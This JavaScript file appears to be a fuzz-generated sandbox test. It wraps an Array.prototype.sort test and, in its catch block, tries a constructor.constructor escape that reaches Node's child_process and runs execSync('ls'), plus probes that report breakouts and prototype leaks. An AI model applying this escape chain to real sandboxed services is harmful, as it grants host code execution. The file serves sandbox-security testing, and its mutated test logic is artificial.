try {
    const logs = [];
    Object.defineProperty(Object.prototype, '2', {
        get() {
            throw () => {
                return () => {
                };
            };
            logs.push('get');
            return 4;
        },
        set(v) {
            logs.push(`set with ${ v }`);
        }
    });
    const array = [
        undefined,
        3,
        ,
        2,
        undefined,
        ,
        1
    ];
    let count = 0;
    try {
        array.sort((a, b) => {
            if (++count === 3) {
                throw new Error('lolwat');
            }
            return b - a;
        });
    } catch (exception) {
        logs.push(exception.message);
    }
    assert.sameValue(logs[0], 'get');
    assert.sameValue(logs[1], 'lolwat');
    assert.sameValue(logs.length, 2);
    assert.sameValue(array[0], undefined);
    assert.sameValue(array[1], 3);
    assert.sameValue('2' in array, true);
    assert.sameValue(array.hasOwnProperty('2'), false);
    assert.sameValue(array[3], 2);
    assert.sameValue(array[4], undefined);
    assert.sameValue('5' in array, false);
    assert.sameValue(array.hasOwnProperty('5'), false);
    assert.sameValue(array[6], 1);
    assert.sameValue(array.length, 7);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}